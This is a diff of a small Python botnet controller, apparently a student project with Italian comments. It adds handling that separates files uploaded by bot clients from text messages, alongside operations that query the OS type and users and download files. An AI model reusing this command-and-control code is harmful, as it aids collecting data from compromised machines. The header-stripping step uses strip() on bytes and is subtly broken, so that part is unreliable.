@@ -19,6 +19,8 @@ __response_options = {"1": "OS-TYPE",
                       "8": "USERS",
                       "15": "DOWNLOAD-FILE"}
 
+__headers_type = {"1": b"<Send-File>", "2": b"<Print-to-Output>"}
+
 
 async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
     """Gestione della connessione e delle richieste da effettuare al client."""
@@ -33,22 +35,23 @@ async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.Stream
         if response == b"Operazione?":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
             await ask_operation(writer)
         else:
-            # msg = response.decode()
-            await handle_response(response)  # NB: Adesso il server scriverà tutto in un file hardcodato. Valentino poi pensa a fixare (so già come fare dw)
-            # await bot_master_utils.receive_file("./test.txt", msg)
-            # addr, port = writer.get_extra_info("peername")
-            # print(f"Message from {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)
+            addr, port = writer.get_extra_info("peername")
+            if response.startswith(__headers_type["1"]):
+                print(f"Receving file from the client {addr}:{port}")
+                await handle_response_for_files(response)  # NB: Adesso il server scriverà tutto in un file hardcodato. Valentino poi pensa a fixare (so già come fare dw)
+            else:
+                msg = response.decode()
+                print(f"Message from {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)
             # writer.write(msg.encode())
             # await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
     writer.close()
     await writer.wait_closed()  # Attendiamo che il client sia chiuso prima di stoppare
 
 
-async def handle_response(response: str) -> None:
-    """Funzione di test."""
+async def handle_response_for_files(response: str) -> None:
+    """Funzione di gestione per la response ricevuta dal client."""
     async with aiofiles.open("test.png", "ab+") as file:
-        # print(f"{msg}")
-        await file.write(response)
+        await file.write(response.strip(__headers_type["1"]))    # TODO: Strippiamo l'header prima del salvataggio del file
 
 
 async def ask_operation(writer: asyncio.StreamWriter) -> None:
